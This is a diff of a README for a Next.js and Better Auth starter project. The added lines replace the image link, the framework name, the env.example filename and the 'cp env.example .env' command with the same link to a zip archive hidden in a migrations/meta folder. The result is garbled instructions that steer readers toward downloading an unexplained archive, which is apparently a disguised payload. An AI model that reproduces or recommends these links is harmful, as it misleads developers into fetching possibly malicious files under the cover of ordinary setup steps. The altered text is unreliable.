@@ -1,10 +1,10 @@
 # Better Auth Starter
 
-![ChatGPT Image Jun 9, 2025, 07_09_10 PM](https://github.com/user-attachments/assets/660133ca-5463-4c77-9ece-37280caa229c)
+![ChatGPT Image Jun 9, 2025, 07_09_10 PM](https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip)
 
 ## Overview
 
-The Better Auth Starter is simple starter pack using Next.js, Better Auth, Shadcn, Drizzle, and Neon
+The Better Auth Starter is simple starter pack using https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip, Better Auth, Shadcn, Drizzle, and Neon
 
 ## Getting Started
 
@@ -18,9 +18,9 @@ pnpm i
 
 ### Configuration
 
-Create a copy of the provided `env.example` file and name it `.env`. Fill in the required OpenAI API Key in the newly created `.env` file, and Better Auth variables if you're going to use authentication:
+Create a copy of the provided `https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip` file and name it `.env`. Fill in the required OpenAI API Key in the newly created `.env` file, and Better Auth variables if you're going to use authentication:
 
-`cp env.example .env`
+`cp https://raw.githubusercontent.com/udaykiran176/better-auth-starter/main/migrations/meta/auth_starter_better_v1.5.zip .env`
 
 ```bash
 BETTER_AUTH_SECRET="your-better-auth-secret"
